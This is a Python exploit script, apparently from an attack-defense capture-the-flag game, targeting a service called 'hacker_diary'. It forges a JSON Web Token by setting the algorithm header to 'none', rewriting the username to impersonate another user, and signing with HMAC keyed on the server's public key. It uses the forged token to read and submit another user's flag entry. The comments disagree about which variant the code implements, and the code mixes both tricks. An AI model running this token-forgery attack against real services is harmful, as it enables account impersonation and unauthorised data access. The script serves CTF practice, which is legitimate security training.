from Crypto import Random
import binascii
from util import *
import base64
import json
from Crypto.Hash import SHA256, HMAC, SHA
import sys
from reqlib import *

def exploit(ip, port, flag_id):
    # based on: https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/
    # a good lesson on not letting your attacker control the algorithm you use for signature checks
    # Both the none exploit and the RSA exploit are implemented, but only the RSA exploit is implemented here.
    # to do the none exploit, simply set alg to none. No signature needs to be applied or appeneded.
    base_url = 'http://' + ip + ':' + str(port) + '/'
    username = (binascii.hexlify(Random.get_random_bytes(10))).decode()
    password = (binascii.hexlify(Random.get_random_bytes(10))).decode()
    
    account = create_account(base_url, username, password)
    jwt = login(base_url, username, password)
    jwt_token = jwt['token']
    entries = get_all_entries(base_url, jwt_token)
    target_entry = dict()
    for entry in entries:
    	if entry['id'] == int(flag_id):
    		target_entry = entry
    if not target_entry:
    	print target_entry
        raise Exception("Entry with flag_id is not in the list1")
    (header, body, signature) = jwt_token.split('.')
    header_decoded = json.loads(base64.b64decode(header).decode())
    # change to 'none' and the server will not perform ANY signature checks!
    header_decoded['alg'] = 'none'
    header_payload = base64.b64encode(json.dumps(header_decoded).encode())

    body_decoded = json.loads(base64.b64decode(body).decode())
    # impersonate the user whose entry we wish to read
    body_decoded['username'] = target_entry['owner']
    body_payload = base64.b64encode(json.dumps(body_decoded).encode())

    to_sign = header_payload + b'.' + body_payload

    # get the public key we know to be the secret. IMO sharing the public key
    # isn't strictly bad, if you were an auth service or similar, you would
    # need some method of distributing your public key to consumers of your tokens
    public_key = get_public_key(base_url)
    hmac = HMAC.new(public_key.encode(), to_sign, SHA)

    payload_signature = base64.b64encode(hmac.digest())

    payload_jwt = to_sign + b'.' + payload_signature

    exploit_entry = get_entry(base_url, payload_jwt.decode(), flag_id)

    return {'FLAG': exploit_entry['entry']}



if __name__ == '__main__':
    flag_id = getflagid("hacker_diary")
    FLAG = exploit("192.168.1.101", "20130", flag_id)
    print "FLAG=  " + FLAG["FLAG"]
    submit("hacker_diary", FLAG["FLAG"])
